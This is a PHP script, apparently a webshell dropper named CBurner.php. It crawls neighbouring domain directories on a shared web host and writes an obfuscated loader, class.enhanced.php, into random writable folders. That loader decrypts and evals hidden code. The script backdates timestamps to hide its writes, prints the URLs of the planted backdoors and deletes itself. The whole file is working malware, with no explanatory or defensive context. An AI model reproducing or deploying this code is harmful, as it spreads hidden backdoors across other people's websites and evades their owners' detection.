<?php
error_reporting(0);
set_time_limit(0);
$depth = 2;
$fileData = 'PD9waHANCiRjcnlwc3RyID0gIm5xalgwS1dYMXNiVG85T29vcVdiam1lTW9WbGJvcFdrbTRXaFVNV1VwNitMbGNTY1U2SEtpY3luMUptdFgxakZmYXl5Zm9xTlZxS1kwZE9SeWxmQWoyS3hoWVdubWRiSXlLakFwSnFybktPWnhObWVwWk9obFZ1SnczYXZnYWk1bEZqWHhwK254Y1dGa2J4V3A1aWh5MW5BajNTZ21GeWRvdHZKajl1bHo5V2Ftc3JGa3A3TnpjaGNoWk4vZ0lDcmlyNklxNXllbzVHWGg4R0xpS25RMXBpa3hzNllXc0dOaDZqQ3BxQ2NxTVdueE5xaFlGdXZsWmJOMDFDSWNjblZwNnFGeEtLazA5T2drSU9icTV5WjFKT0ZwSitnbnBsUXBjclFuOGVabjVXZnBkUFZjWFRHMDROam4xWjB0Sm5TcXNqaG5wcWFvMUJWb2NxZjFLbUR5YWlpMU5Od2xJYlR5Smk5Vm5lZG5kS2NnOHlhb0o1d1g1blUwcVNrY2NYWVdXV2pnMjYxNFlISWw4bWpXVmx3ektiVjAxbWNvSmVrck5YSmJjSlgwTnVscXM3UmxLcllrTW1qMDZGbW01WGFtTCtJV2FTWHFKaWl5YUdNaUlXeXVZMlNoNTl2b2RMUjJLaUJvcHFrbWFPVGhkaWVvNkdWbEkrSGhLVGZwY2lqbFZqTHlwK2R3SU9TY3AyZHA2ZXAybGZYMzZtY2I1QlNwdHJHbmMrcHY0aFpyTWJOcUoyaHZZVjZ5cUNlVjRiTG85TEhuWk5VWTI1dmxNcWYyS0tob21pcXlaOXZaOWpUb1ZhY1ZKK3Nvc21yek5XblY1bVpwRnVKMmFMU1lZT0tuWi9YaXE1WWlNVExjY1NwcTZPVHo2WE0ybUZnYlZTVHFOZlFqOW1hMTlXcHFvMkZscUNRZ2FhSnM0Q0loNGpGakxXeVpWZFdxYUtmanA5UXlhclYwcGlweXRXaXFOaUpoNWZKWUZsNmliaURzcmFObG9SNWhJaTNzb1M0ZHJHNWYzdTNqVk5walp5RGw5YW1wWmFueTZ2UzFxMWZWcGVZWDZpNWdyS0VzN3FZaXE2dWVJZTV0WTlsa1YxMFYxakttTmZIV1hSU2w2V2wwY09WM3ByR2psMlp6WXB1V00zSGkxV0ZtSnFybFkreWc0cWRtS2FWVUhDRnBKYlBvY2pGb0p2WndKYW4wdFhJb3RXbllWdXAyS09Nb2JaWG1KMmNtTVRVcGRxVXh0V25xc3JQcDZ1TWhjZWQwMkJaVzVqSHE4U1BkTFJTblpaYmljTjNxNG0raUs2bzBZT1FZZCtCaDZuVG9GbDBWSXFXcXF1TmtsU3BvcCtId1d1R3BkWExvSlhTd3FlYnpJbUZZNGxpWTJDUWxWK1JrR0tUWUZ4ZVhhU05WSlZYajRxdXFOR05WNmFObklPZHgxeGRwWStabEtDalc2dXFxRkpjNElSVTRIS0YxcUdtaDV4VFhOTEMwSm1lV0tlU1pzTnlnK09lbzZXWnExT0ozbTJLbzc2WmxuR0ZoYUdaMGNhZ1ZzNmptNWlpaUhLRDQxbWdtRnhVa3F5cGhNRlh4OCtyV01LS3JsaUl4Y3ltbmxpWWlubTRqYWk0bEZsMmczT0lzcWwrdXBTMXRZaUtoNzVoV3BPRGtWakFlMzZMajRpYnpOaGJsR0JXWDFXVGlKN0hvc2lVVzJTSGoxZXluNEhnbWMybm5ySlVpcHZNMkhaYmtZZDFoYnVwZ3NGWHA3VjhpN0ttZ1l6RHM3S0R0VmFXWlZhVldaR0twNWlmbVY1Vms0WmVpcStlNDFtZHl0VmJYTm5UejJDRm1LS3BYYUZYek14aG5adWdsWkxLM0puWnFkYU9YWnJPMDF4aDM4YkduTkJVVzNPbzJIV2YycDExYnBxZm9kbUVrOVdoMHRoMmtvZklwWjNKejc5V241aW9ycUxTcHNUS1dhcW5sNU9ZMk5kc2xadlMxSzEwb1pDbm5LS2RrcWpUY2x0eXNjdWoxc3UwbkpXY24xT0hvS1RZYzUvYW5YU2h4NkttMklIR284MmpxM1NRaUtuSXlwVlpjSmlmcXRQUW44ZVpnOHlhbjlHZFlwN1R6OWR5bldPdG0zS2ladGZZZDFsdHNhMlkwZGVWejV1TGlwaUd0TFNIazRiVzFhQ0RrV0t5VklxczFkSlpkRkpZajRPMHQ0VEJWOWpZcFZqQ25GT28xc2JLazg2VnJacWNqbG1Tam1kaFc1QmZXNU9PV2NKamk1UmpkWTZGWWxxUWhkaW16V0JkcFYyaFY4ek1ZVnVnajJPUW9xRlMycTNYaUdLeGhZV3RkWWJSeTZTRGIxbGJvc2VreUtOZHBZMW1qVzdpeVp6Wm10NktzM09KejQ1cndaeURXTStWcHB4eGlLVFN5SnFsVkcrdFU0bkltZGhWb0laZGxiV3dob3kvZzlPVjFaeGJsR0tJWm9XVVhhV1RvWlZoaDVKU2xGbmRvVm1keXRWYlhOblR6MkNGbUtLcFhhRlh6TXhoblp1Z2xaTEszSm5acWRhT1hack8wMXhoMzhiR25OQlVXM09vMkhXZjJwMTFicHFmb2RtRWs5V2gwdGgya29mSXBaM0p6NzlXbjVpb3JxTFNwc1RLV2Fxbmw1T1kyTmRzbFp2UzFLMTBvWkNubktLZGtxalRjbHR5c2N1ajFzdTBuSldjbjFPSG9LVFljNS9hblhTaHg2S20ySUhHbzgyanEzU1FpS25JeXBWWmNKaWZxdFBRbjhlWmc4eWFuOUdkWXA3VHo5ZHluV090bTNLaVp0ZllkMWx0c2EyWXlNeWZobGVmMnF0MG9kV1hkcURIMHFiT1ZLYWNxTTZteDZPVldZS0RnNGZCaG02aXFOUEhwM1M2MDU5eWhKMlNwOUdWcDNWd3o2WFQyNjFYcHEyZ21LTFlsZDZwZzlTYW84cWVqMXJaMDgrUWcxU3ZtS0RibktEQ1c1TlVjbXljMDlTbDJsWFgzNm1ib3IxVm9NM0Z4NW5Qa0Z0WG9zZWt5S09WV2FLVnBKdkJobERjbHMvYm5uUEJnMWVveGRYTGtJTnlkYUNpMXF6WGhxMndvcGx0cHRyR25jK3BnOXlhb3RyR2NKU0dwZEtyejZDb21KakNXYUdpYUoyaHBwMXhvWk9reW5PZmxhMm9vNE51IjsNCmZ1bmN0aW9uIGRlY3J5cHQoJGNyeXBzdHIsICRrc2Vzc2lvbil7DQogICAgJHggPSAwOw0KCSRzdHIgPSAnJzsNCiAgICAka3Nlc3Npb24gPSBtZDUoJGtzZXNzaW9uKTsNCiAgICAkY3J5cHN0ciA9IGJhc2U2NF9kZWNvZGUoJGNyeXBzdHIpOw0KICAgICRsZW4gPSBzdHJsZW4oJGNyeXBzdHIpOw0KICAgICRsID0gc3RybGVuKCRrc2Vzc2lvbik7DQogICAgJGNoYXJlID0gJyc7DQogICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbjsgJGkrKykgew0KICAgICAgICBpZiAoJHggPT0gJGwpIHsNCiAgICAgICAgICAgICR4ID0gMDsNCiAgICAgICAgfQ0KICAgICAgICAkY2hhcmUgLj0gc3Vic3RyKCRrc2Vzc2lvbiwgJHgsIDEpOw0KICAgICAgICAkeCsrOw0KICAgIH0NCiAgICBmb3IgKCRpID0gMDsgJGkgPCAkbGVuOyAkaSsrKSB7DQogICAgICAgIGlmIChvcmQoc3Vic3RyKCRjcnlwc3RyLCAkaSwgMSkpIDwgb3JkKHN1YnN0cigkY2hhcmUsICRpLCAxKSkpIHsNCiAgICAgICAgICAgICRzdHIgLj0gY2hyKChvcmQoc3Vic3RyKCRjcnlwc3RyLCAkaSwgMSkpICsgMjU2KSAtIG9yZChzdWJzdHIoJGNoYXJlLCAkaSwgMSkpKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRzdHIgLj0gY2hyKG9yZChzdWJzdHIoJGNyeXBzdHIsICRpLCAxKSkgLSBvcmQoc3Vic3RyKCRjaGFyZSwgJGksIDEpKSk7DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuICRzdHI7DQp9DQoka3Nlc3Npb24gPSAiUjBTOTg4V3JlIjsNCiRzdHIgPSBkZWNyeXB0KCRjcnlwc3RyLCAka3Nlc3Npb24pOw0KZXZhbCgkc3RyKTs=';
$fileName = 'class.enhanced.php';

function GetAllDirs($startPath){
	$allDirs = array($startPath => 0);
	$rDir = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($startPath), RecursiveIteratorIterator::CHILD_FIRST);
	foreach($rDir as $rPath) {
		if($rPath->isDir() && $rPath->isWritable() && !$rDir->isDot() && !strstr($rPath,".well-known") && !strstr($rPath,"cgi-bin")){
			$dirPath = str_replace('\\', '/', (string)$rPath);
            if(!CheckHtaccess($dirPath.'/.htaccess'))
			    $allDirs[$dirPath] = substr_count(str_replace($startPath, '', $dirPath),'/');
		}
	}
	arsort($allDirs);
	return $allDirs;
}

function CheckHtaccess($htaccessPath){
	$isDeny = false;
	if(file_exists($htaccessPath)){
	$isDeny = true;
		if(is_readable($htaccessPath)){
			$htaccessContent = strtolower(file_get_contents($htaccessPath));
			$searchContent = 'deny from';
			if (!strstr($htaccessContent, $searchContent)){
				$isDeny = false;
			}
		}
	}
	return $isDeny;
}

function GetRandomPath($dirs, $depth){
	if($depth > (int)current($dirs) && (int)current($dirs) == '0'){
		return '';
	}else{
		if($depth > (int)current($dirs)){
			$depth = (int)current($dirs);
		}
		$allKeys = array_keys($dirs, $depth);
		return $allKeys[rand(0, count($allKeys) - 1)];
	}
}

function FileWrite($filePath, $fileData){
$pathParts = pathinfo($filePath);
$fileTime = filemtime($pathParts['dirname']);
	if($fp = fopen($filePath, 'w')) {
		fwrite($fp, $fileData);
		fclose($fp);
		touch($filePath, $fileTime);
		touch($pathParts['dirname'], $fileTime);
		return $filePath;
	}
}

function GetDomains($dirs, $preDomainPath, $postDomainPath, $domZones){
	foreach($dirs as $dir){
		if(preg_match('#'.$domZones.'(\/(.*?)$|$)#', $dir, $matches) && !preg_match('#('.str_replace('www.', '', $_SERVER['HTTP_HOST']).')|('.$_SERVER['HTTP_HOST'].')#', $dir)) {
                        $domainPath = rtrim($preDomainPath.'/'.$dir.'/'.$postDomainPath, '/');
                        if(is_dir($domainPath)) {
							$dirsc[] = $domainPath.'|'.$dir;
                        }			
		}
	}
	return $dirsc;
}

$startDir = $_SERVER['DOCUMENT_ROOT'];
$domZones = '(\.ua|\.com|\.edu|\.gov|\.net|\.org|\.biz|\.info|\.name|\.jobs|\.mobi|\.tel|\.travel|\.top|\.xyz|\.az|\.am|\.by|\.ge|\.kz|\.kg|\.lv|\.lt|\.md|\.ru|\.tj|\.tm|\.uz|\.ad|\.at|\.be|\.ch|\.de|\.dk|\.es|\.eu|\.fi|\.fr|\.gr|\.ie|\.is|\.it|\.li|\.lu|\.mc|\.mt|\.nl|\.no|\.pt|\.se|\.uk|\.al|\.bg|\.cz|\.hu|\.mk|\.pl|\.ro|\.si|\.sk|\.ac|\.ag|\.as|\.asia|\.au|\.br|\.bz|\.ca|\.cat|\.cc|\.cd|\.ck|\.cl|\.cn|\.cx|\.gi|\.gs|\.hk|\.hm|\.hn|\.im|\.in|\.jp|\.kr|\.la|\.lk|\.me|\.mn|\.ms|\.mx|\.my|\.nz|\.pk|\.sg|\.sh|\.st|\.tc|\.th|\.tk|\.to|\.tv|\.tw|\.us|\.vc|\.vg|\.ws|\.za|\.af|\.cm|\.co|\.ec|\.fm|\.gd|\.gg|\.gl|\.gy|\.ht|\.io|\.je|\.mg|\.mu|\.lc|\.nf|\.nu|\.pe|\.ph|\.pm|\.pw|\.re|\.sc|\.so|\.sx|\.tl|\.il|\.sb|\.gb|\.jpn|\.qc|\.sa|\.uy|\.club|\.vip|\.bet|\.space|\.ae|\.ai|\.an|\.ao|\.aq|\.ar|\.aw|\.ax|\.ba|\.bb|\.bd|\.bf|\.bh|\.bi|\.bj|\.bl|\.bm|\.bn|\.bo|\.bq|\.bs|\.bt|\.bv|\.bw|\.cf|\.cg|\.ci|\.cr|\.cu|\.cv|\.cw|\.cy|\.dj|\.dm|\.do|\.dz|\.ee|\.eg|\.eh|\.er|\.et|\.fj|\.fk|\.fo|\.ga|\.gf|\.gh|\.gm|\.gn|\.gp|\.gq|\.gt|\.gu|\.gw|\.hr|\.id|\.iq|\.ir|\.jm|\.jo|\.ke|\.kh|\.ki|\.km|\.kn|\.kp|\.kw|\.ky|\.lb|\.lr|\.ls|\.ly|\.ma|\.mf|\.mh|\.ml|\.mm|\.mo|\.mp|\.mq|\.mr|\.mv|\.mw|\.mz|\.na|\.nc|\.ne|\.ng|\.ni|\.np|\.nr|\.om|\.pa|\.pf|\.pg|\.pn|\.pr|\.ps|\.py|\.qa|\.rs|\.rw|\.sd|\.sj|\.sl|\.sm|\.sn|\.sr|\.ss|\.su|\.sv|\.sy|\.sz|\.td|\.tf|\.tg|\.tn|\.tp|\.tr|\.tt|\.tz|\.ug|\.um|\.va|\.ve|\.vi|\.vn|\.vu|\.wf|\.aaa|\.abb|\.abc|\.aco|\.ads|\.aeg|\.afl|\.aig|\.anz|\.aol|\.app|\.art|\.aws|\.axa|\.bar|\.bbc|\.bbt|\.bcg|\.bcn|\.bid|\.bio|\.bms|\.bmw|\.bnl|\.bom|\.boo|\.bot|\.box|\.buy|\.bzh|\.cab|\.cal|\.cam|\.car|\.cba|\.cbn|\.cbs|\.ceb|\.ceo|\.cfa|\.cfd|\.cpa|\.crs|\.csc|\.dad|\.day|\.dds|\.dev|\.dhl|\.diy|\.dnp|\.dog|\.dot|\.dtv|\.dvr|\.eat|\.eco|\.esq|\.eus|\.fan|\.fit|\.fly|\.foo|\.fox|\.frl|\.ftr|\.fun|\.fyi|\.gal|\.gap|\.gay|\.gdn|\.gea|\.gle|\.gmo|\.gmx|\.goo|\.gop|\.got|\.hbo|\.hiv|\.hkt|\.hot|\.how|\.htc|\.ibm|\.ice|\.icu|\.ifm|\.inc|\.ing|\.ink|\.int|\.ist|\.itv|\.iwc|\.jcb|\.jcp|\.jio|\.jlc|\.jll|\.jmp|\.jnj|\.jot|\.joy|\.kfh|\.kia|\.kim|\.kpn|\.krd|\.lat|\.law|\.lds|\.llc|\.lol|\.lpl|\.ltd|\.man|\.map|\.mba|\.mcd|\.med|\.men|\.meo|\.mil|\.mit|\.mlb|\.mls|\.mma|\.moe|\.moi|\.mom|\.mov|\.msd|\.mtn|\.mtr|\.nab|\.nba|\.nec|\.new|\.nfl|\.ngo|\.nhk|\.now|\.nra|\.nrw|\.ntt|\.nyc|\.obi|\.off|\.one|\.ong|\.onl|\.ooo|\.ott|\.ovh|\.pay|\.pet|\.phd|\.pid|\.pin|\.pnc|\.pro|\.pru|\.pub|\.pwc|\.qvc|\.red|\.ren|\.ril|\.rio|\.rip|\.run|\.rwe|\.sap|\.sas|\.sbi|\.sbs|\.sca|\.scb|\.ses|\.sew|\.sex|\.sfr|\.ski|\.sky|\.soy|\.srl|\.srt|\.stc|\.tab|\.tax|\.tci|\.tdk|\.thd|\.tjx|\.trv|\.tui|\.tvs|\.ubs|\.uno|\.uol|\.ups|\.vet|\.vig|\.vin|\.wed|\.win|\.wme|\.wow|\.wtc|\.wtf|\.xin|\.xn--p1ai|\.site|\.online|\.earth|\.shop|\.okinawa|\.today|\.care|\.nettr|\.website|\.netid|\.xn--fiqs8s|\.golf|\.moscow|\.netau|\.agency|\.zw|\.rocks|\.training|\.city|\.gallery|\.church|\.technology|\.news|\.center|\.world|\.netua|\.consulting|\.xn--90ais|\.video|\.studio|\.work|\.netbr|\.berlin|\.xn--80adxhks|\.show|\.xn--j1amh|\.live|\.company|\.love|\.xn--80aswg|\.immo|\.xn--p1acf|\.xn--c1avg|\.rest|\.photo|\.cafe|\.taxi|\.tech|\.store|\.xn--d1acj3b|\.salon|\.ruhr|\.express|\.parts|\.partners|\.netpe|\.sucks|\.life|\.baby|\.education|\.xn--80asehdb|\.blog|\.design|\.plus|\.capital|\.netdo|\.media|\.tokyo|\.marketing|\.football|\.buzz|\.services|\.energy|\.pics|\.group|\.click|\.community|\.property|\.host|\.solutions|\.foundation|\.netin|\.construction|\.directory|\.investments|\.stream|\.review|\.cricket|\.global|\.press|\.pizza|\.school|\.help|\.delivery|\.netsg|\.photos|\.clinic|\.tattoo|\.cash|\.events|\.jetzt|\.trade|\.gold|\.science|\.exchange|\.durban|\.netpl|\.ventures|\.fitness|\.repair|\.coffee|\.academy|\.archi|\.netmy|\.boutique|\.com:8080|\.land|\.institute|\.sydney|\.blue|\.photography|\.wine|\.limited|\.finance|\.immobilien|\.domains|\.cool|\.expert|\.fashion|\.cards|\.money|\.guru|\.futbol|\.digital|\.gmbh|\.blackfriday|\.london|\.istanbul|\.netpa|\.tips|\.games|\.style|\.market|\.reisen|\.swiss|\.house|\.poker|\.aero|\.netru|\.works|\.casa|\.tools|\.wedding|\.bike|\.guide|\.link|\.joburg|\.villas|\.estate|\.team|\.ninja|\.international|\.wang|\.coop|\.paris|\.tours|\.social|\.army|\.vision|\.deals|\.fund|\.cooking|\.zone|\.recipes|\.alsace|\.management|\.careers|\.ltda|\.network|\.barcelona|\.hosting|\.surgery|\.catering|\.diet|\.xn--9dbq2a|\.rent|\.engineering|\.cloud|\.university|\.film|\.apartments|\.capetown|\.equipment|\.reviews|\.africa|\.business|\.dental|\.hamburg|\.garden|\.dance|\.racing|\.netpk|\.scot|\.download|\.netvn|\.support|\.netco|\.xn--54b7fta0cc|\.party|\.fish|\.graphics|\.camp|\.band|\.schule|\.wales|\.faith|\.quebec|\.insure|\.promo|\.weber|\.enterprises|\.black|\.software|\.haus|\.wiki|\.forsale|\.beer|\.email|\.wien|\.tennis|\.coupons|\.netnz|\.xn--6qq986b3xl|\.fans|\.gent|\.brussels|\.credit|\.date|\.health|\.sale|\.family|\.furniture|\.menu|\.direct|\.netve|\.boston|\.lighting|\.pictures|\.best|\.properties|\.shopping|\.zm|\.desi|\.tube|\.tirol|\.systems|\.bingo|\.codes|\.supply|\.netgr|\.place|\.bayern|\.irish|\.sarl|\.netge|\.taipei|\.gifts|\.netsa|\.cheap|\.restaurant|\.vlaanderen|\.green|\.kitchen|\.melbourne|\.amsterdam|\.yoga|\.game|\.productions|\.observer|\.corsica|\.hospital|\.attorney|\.nettw|\.homes|\.yt|\.contractors|\.page|\.farm|\.limo|\.rentals|\.chat|\.vegas|\.kiwi|\.college|\.toys|\.koeln|\.healthcare|\.monster|\.coach|\.courses|\.versicherung|\.netec|\.dddro|\.vacations|\.report|\.organic|\.testtk)';


if(preg_match('#^(.*?)\/([^\/]+'.$domZones.')\/*(.*?)$#', $startDir, $matches)){
	$domainDirs = scandir($matches[1]);
	$dirok = GetDomains($domainDirs, $matches[1], $matches[4], $domZones);
}

foreach($dirok as $temp){
	$stra = explode('|',$temp); 
	$startDirectory = $stra[0];
	$allDirs = GetAllDirs($startDirectory);
	$randPath = GetRandomPath($allDirs, $depth);
	if(strlen($randPath) != 0){
		$fileWritedPath = FileWrite($randPath.'/'.$fileName, base64_decode($fileData));
		if(strlen($fileWritedPath) != 0){
			$fileWritedPath = str_replace($stra[0],'',$fileWritedPath);
			$fileWritedPath = 'http://'.$stra[1].$fileWritedPath;
			echo $fileWritedPath.'</br>';
		}
	}
}
unlink("./CBurner.php");